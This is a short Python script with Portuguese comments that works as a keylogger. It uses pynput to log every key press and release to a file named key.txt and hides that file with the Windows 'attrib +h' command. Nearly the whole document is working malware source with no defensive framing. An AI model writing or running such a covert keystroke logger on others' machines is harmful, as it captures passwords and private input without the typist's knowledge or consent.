import os
from pynput.keyboard import Listener, Key

arq = "key.txt"
open(arq, "w")
os.system(f"attrib +h {arq}")

def pressionada(key):
    with open(arq, "a") as arquivo:
        arquivo.write(f"{key} foi pressionada\n")

def soltou(key):
    with open(arq,"a") as arquivo: # Usando "A" pois irá colocar ao final e não subscrever
        arquivo.write(f"{key} foi solto\n")
    '''if key == Key.esc:
        return False'''
        # Caso queira para o processo pressionando a tecla esc.
    

with Listener(on_press=pressionada, on_release=soltou) as listener:
    listener.join()
